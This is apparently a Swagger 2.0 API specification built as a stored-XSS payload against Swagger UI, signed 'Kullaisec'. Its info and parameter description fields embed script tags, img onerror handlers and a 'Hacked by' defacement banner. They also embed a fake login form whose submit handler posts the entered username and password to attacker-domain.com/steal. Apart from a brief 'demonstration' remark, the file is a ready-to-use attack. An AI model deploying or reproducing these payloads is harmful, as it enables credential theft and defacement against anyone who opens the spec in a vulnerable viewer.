swagger: '2.0'
info:
  title: XSS Attack BY Kullaisec
  description: |
    <marquee behavior="scroll" direction="left" style="font-size:24px;color:red;">Hacked by Kullaisec</marquee>
    <img src="https://via.placeholder.com/150" onerror="alert('Image load failed! XSS executed.');">
    <script>
      alert('Warning: JavaScript Executed!');
      document.body.innerHTML += '<h1 style="color:red;">You are hacked!</h1>';
    </script>
    <form action="#" onsubmit="fetch('https://attacker-domain.com/steal', {method: 'POST', body: new URLSearchParams({username: this.username.value, password: this.password.value})}); alert('Credentials sent to attacker!'); return false;">
      <label for="username">Username:</label><br>
      <input type="text" id="username" name="username"><br>
      <label for="password">Password:</label><br>
      <input type="password" id="password" name="password"><br><br>
      <button type="submit">Login</button>
    </form>
  version: production
basePath: /JSSResource/
produces:
  - application/xml
  - application/json
consumes:
  - application/xml
  - application/json
security:
  - basicAuth: []
paths:
  /loginpage:
    get:
      summary: Displays a malicious login page
      description: |
        An endpoint that serves a login page with an embedded XSS attack for demonstration purposes.
      responses:
        '200':
          description: HTML login page
          schema:
            type: string
      tags:
        - Kullai_XSS_Login
      operationId: displayLoginPage
  '/hack/hachid/{id}':
    delete:
      parameters:
        - description: |
            <marquee behavior="alternate" style="color:blue;font-size:18px;">Hacked by Kullaisec</marquee>
            <img src="nonexistent.png" onerror="alert('XSS Image Trigger!');">
            <script>alert('ID parameter exploited!');</script>
          format: int64
          in: path
          name: id
          required: true
          type: integer
      responses:
        '200':
          description: No response was specified
